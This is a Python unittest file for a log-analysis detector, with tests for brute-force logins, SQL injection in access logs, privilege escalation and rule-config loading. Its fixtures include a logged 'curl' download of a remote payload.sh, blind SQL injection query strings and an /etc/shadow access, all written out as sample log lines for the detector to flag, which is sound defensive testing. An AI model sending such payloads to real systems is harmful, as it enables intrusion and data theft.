import importlib.util
import json
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from logcheck.config import config_to_dict, default_config, load_config
from logcheck.models import DetectionConfig, Event
from logcheck.rules import detect_findings


class RuleTests(unittest.TestCase):
    def test_keyword_rule_detects_failed_login(self):
        event = Event(
            source_file="auth.log",
            line_number=1,
            raw_line="Failed password for invalid user admin from 192.0.2.10",
            category="auth",
            actor="admin",
            source_address="192.0.2.10",
            message="Failed password for invalid user admin from 192.0.2.10",
        )
        findings = detect_findings([event], default_config())
        self.assertTrue(any(f.rule_id == "keyword.failed_login" for f in findings))

    def test_repeated_failed_login_detects_brute_force(self):
        events = [
            Event(
                "auth.log",
                i,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            )
            for i in range(1, 6)
        ]
        findings = detect_findings(events, default_config())
        brute_force = [f for f in findings if f.rule_id == "correlation.brute_force"]
        self.assertEqual(len(brute_force), 1)
        self.assertEqual(brute_force[0].severity, "high")
        self.assertEqual(brute_force[0].count, 5)

    def test_repeated_failed_logins_do_not_create_multi_signal_finding(self):
        events = [
            Event(
                "auth.log",
                i,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            )
            for i in range(1, 6)
        ]

        findings = detect_findings(events, default_config())

        self.assertFalse(
            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
        )

    def test_custom_threshold_is_applied(self):
        config = DetectionConfig(keywords=default_config().keywords, brute_force_threshold=2)
        events = [
            Event(
                "auth.log",
                1,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            ),
            Event(
                "auth.log",
                2,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            ),
        ]
        findings = detect_findings(events, config)
        self.assertTrue(any(f.rule_id == "correlation.brute_force" for f in findings))

    def test_suspicious_command_finding_includes_reasons(self):
        events = [
            Event(
                source_file="app.log",
                line_number=1,
                raw_line="user ran curl http://198.51.100.7/payload.sh",
                category="command",
                actor="alice",
                source_address="192.0.2.10",
                message="curl http://198.51.100.7/payload.sh",
            )
        ]

        findings = detect_findings(events, default_config())

        suspicious = [finding for finding in findings if finding.rule_id.startswith("behavior.")]
        self.assertTrue(suspicious)
        self.assertIsNotNone(suspicious[0].severity_reason)
        self.assertIsNotNone(suspicious[0].confidence_reason)

    def test_url_encoded_sql_injection_access_log_creates_behavior_finding(self):
        events = [
            Event(
                source_file="access.log",
                line_number=i,
                raw_line=(
                    '172.17.0.1 - - [01/Sep/2021:01:37:25 +0000] '
                    '"GET /index.php?id=1%20and%20if(substr(database(),1,1)%20=%20'
                    "'s',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1\" "
                    '200 472 "-" "python-requests/2.26.0"'
                ),
                category="access",
                source_address="172.17.0.1",
                message="/index.php?id=1%20and%20if(substr(database(),1,1)%20=%20's',1,(select%20table_name%20from%20information_schema.tables))",
            )
            for i in range(1, 6)
        ]

        findings = detect_findings(events, default_config())

        sqli = [finding for finding in findings if finding.rule_id == "behavior.web_sql_injection"]
        self.assertEqual(len(sqli), 1)
        self.assertEqual(sqli[0].severity, "critical")
        self.assertEqual(sqli[0].source_address, "172.17.0.1")
        self.assertEqual(sqli[0].count, 5)
        self.assertIsNotNone(sqli[0].severity_reason)
        self.assertIsNotNone(sqli[0].confidence_reason)

    def test_boolean_blind_sql_injection_group_mentions_enumeration_traits(self):
        events = [
            Event(
                source_file="access.log",
                line_number=i,
                raw_line=f"raw {i}",
                category="access",
                source_address="172.17.0.1",
                target="/index.php",
                message=f"/index.php?id=1%20and%20if(substr(database(),{i},1)%20=%20'a',1,(select%20table_name%20from%20information_schema.tables))",
                metadata={
                    "decoded_request": f"/index.php?id=1 and if(substr(database(),{i},1) = 'a',1,(select table_name from information_schema.tables))",
                    "path": "/index.php",
                    "status_code": 200,
                    "response_size": 420 + i,
                    "user_agent": "python-requests/2.26.0",
                },
            )
            for i in range(1, 7)
        ]

        findings = detect_findings(events, default_config())

        sqli = [finding for finding in findings if finding.rule_id == "behavior.web_sql_injection"]
        self.assertEqual(len(sqli), 1)
        self.assertEqual(sqli[0].target, "/index.php")
        self.assertIn("blind", sqli[0].confidence_reason.lower())
        self.assertIn("substr", sqli[0].matched_keyword)

    def test_repeated_non_access_sql_text_does_not_emit_web_sql_injection(self):
        events = [
            Event(
                source_file="app.log",
                line_number=i,
                raw_line="debug query select table_name from information_schema.tables and if(substr(database(),1,1) = 'a', 1, 0)",
                category="application",
                source_address="172.17.0.1",
                message="debug query select table_name from information_schema.tables and if(substr(database(),1,1) = 'a', 1, 0)",
            )
            for i in range(1, 8)
        ]

        findings = detect_findings(events, default_config())

        self.assertFalse(
            any(f.rule_id == "behavior.web_sql_injection" for f in findings)
        )

    def test_web_sql_injection_evidence_is_bounded(self):
        events = [
            Event(
                source_file="access.log",
                line_number=i,
                raw_line=f"raw sqli {i}",
                category="access",
                source_address="172.17.0.1",
                target="/index.php",
                message=f"/index.php?id=1%20and%20if(substr(database(),{i},1)%20=%20'a',1,(select%20table_name%20from%20information_schema.tables))",
                metadata={
                    "decoded_request": f"/index.php?id=1 and if(substr(database(),{i},1) = 'a',1,(select table_name from information_schema.tables))",
                    "path": "/index.php",
                    "status_code": 200,
                    "response_size": 427,
                },
            )
            for i in range(1, 21)
        ]

        finding = next(
            finding for finding in detect_findings(events, default_config())
            if finding.rule_id == "behavior.web_sql_injection"
        )

        self.assertLessEqual(len(finding.evidence), 6)
        self.assertEqual(finding.count, 20)

    def test_repeated_benign_access_requests_do_not_emit_sql_injection(self):
        events = [
            Event(
                source_file="access.log",
                line_number=i,
                raw_line=f"raw benign {i}",
                category="access",
                source_address="172.17.0.1",
                target="/index.php",
                message="/index.php?page=home",
                metadata={
                    "decoded_request": "/index.php?page=home",
                    "path": "/index.php",
                    "status_code": 200,
                    "response_size": 512,
                },
            )
            for i in range(1, 30)
        ]

        findings = detect_findings(events, default_config())

        self.assertFalse(any(f.rule_id == "behavior.web_sql_injection" for f in findings))

    def test_sudo_failure_creates_privilege_escalation_finding(self):
        event = Event(
            source_file="auth.log",
            line_number=1,
            raw_line="Jun  2 10:03:01 ubuntu sudo: pam_unix(sudo:auth): authentication failure; user=root",
            category="auth",
            actor="root",
            message="pam_unix(sudo:auth): authentication failure; user=root",
        )

        findings = detect_findings([event], default_config())

        privilege = [
            finding
            for finding in findings
            if finding.rule_id == "behavior.privilege_escalation"
        ]
        self.assertEqual(len(privilege), 1)
        self.assertEqual(privilege[0].severity, "high")
        self.assertIn("Privilege escalation", privilege[0].explanation)
        self.assertEqual(privilege[0].line_number, 1)
        self.assertIsNotNone(privilege[0].severity_reason)
        self.assertIsNotNone(privilege[0].confidence_reason)

    def test_sensitive_path_creates_privilege_escalation_finding(self):
        event = Event(
            source_file="app.log",
            line_number=2,
            raw_line="2026-06-02 10:04:00 ERROR permission denied user=guest ip=198.51.100.7 path=/etc/shadow",
            category="application",
            actor="guest",
            source_address="198.51.100.7",
            message="permission denied user=guest ip=198.51.100.7 path=/etc/shadow",
        )

        findings = detect_findings([event], default_config())

        self.assertTrue(
            any(
                finding.rule_id == "behavior.privilege_escalation"
                for finding in findings
            )
        )

    def test_multi_signal_actor_creates_correlated_behavior_finding(self):
        events = [
            Event(
                "auth.log",
                1,
                "Failed password for root from 192.0.2.10",
                category="auth",
                actor="root",
                source_address="192.0.2.10",
                message="Failed password",
            ),
            Event(
                "auth.log",
                2,
                "Invalid user admin from 192.0.2.10",
                category="auth",
                actor="admin",
                source_address="192.0.2.10",
                message="Invalid user",
            ),
        ]

        findings = detect_findings(events, default_config())

        self.assertTrue(
            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
        )

    def test_single_suspicious_command_does_not_create_multi_signal_finding(self):
        event = Event(
            source_file="app.log",
            line_number=1,
            raw_line="user ran curl http://198.51.100.7/payload.sh",
            category="command",
            actor="alice",
            source_address="192.0.2.10",
            message="curl http://198.51.100.7/payload.sh",
        )

        findings = detect_findings([event], default_config())

        self.assertFalse(
            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
        )

    def test_json_rule_file_is_loaded(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(
                json.dumps(
                    {
                        "keywords": {"custom_rule": ["needle"]},
                        "brute_force": {"threshold": 3, "window_minutes": 7},
                    }
                ),
                encoding="utf-8",
            )

            config = load_config(path)

        self.assertEqual(config.keywords, {"custom_rule": ["needle"]})
        self.assertEqual(config.brute_force_threshold, 3)
        self.assertEqual(config.brute_force_window_minutes, 7)
        self.assertEqual(
            config_to_dict(config),
            {
                "keywords": {"custom_rule": ["needle"]},
                "brute_force": {"threshold": 3, "window_minutes": 7},
            },
        )

    def test_config_to_dict_can_be_reloaded_from_json(self):
        original = DetectionConfig(
            keywords={"custom_rule": ["needle", "signal"]},
            brute_force_threshold=4,
            brute_force_window_minutes=12,
        )
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(json.dumps(config_to_dict(original)), encoding="utf-8")

            reloaded = load_config(path)

        self.assertEqual(reloaded, original)

    def test_yaml_rule_file_is_loaded_when_yaml_is_available(self):
        if importlib.util.find_spec("yaml") is None:
            self.skipTest("PyYAML is not installed")
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.yaml"
            path.write_text(
                "keywords:\n  custom_rule:\n    - needle\nbrute_force:\n  threshold: 2\n  window_minutes: 6\n",
                encoding="utf-8",
            )

            config = load_config(path)

        self.assertEqual(config.keywords, {"custom_rule": ["needle"]})
        self.assertEqual(config.brute_force_threshold, 2)
        self.assertEqual(config.brute_force_window_minutes, 6)

    def test_malformed_yaml_rule_file_raises_value_error_when_yaml_is_available(self):
        if importlib.util.find_spec("yaml") is None:
            self.skipTest("PyYAML is not installed")
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.yaml"
            path.write_text("keywords:\n  custom_rule:\n    - [needle\n", encoding="utf-8")

            with self.assertRaises(ValueError):
                load_config(path)

    def test_rule_config_rejects_invalid_keyword_shape(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(json.dumps({"keywords": {"bad": "needle"}}), encoding="utf-8")

            with self.assertRaises(ValueError):
                load_config(path)

    def test_rule_config_rejects_invalid_brute_force_shape(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(json.dumps({"brute_force": "bad"}), encoding="utf-8")

            with self.assertRaises(ValueError):
                load_config(path)

    def test_rule_config_rejects_non_integer_brute_force_values(self):
        cases = [
            {"threshold": True},
            {"threshold": 3.5},
            {"window_minutes": False},
            {"window_minutes": 7.5},
        ]
        for brute_force in cases:
            with self.subTest(brute_force=brute_force):
                with TemporaryDirectory() as tmp:
                    path = Path(tmp) / "rules.json"
                    path.write_text(json.dumps({"brute_force": brute_force}), encoding="utf-8")

                    with self.assertRaises(ValueError):
                        load_config(path)


if __name__ == "__main__":
    unittest.main()
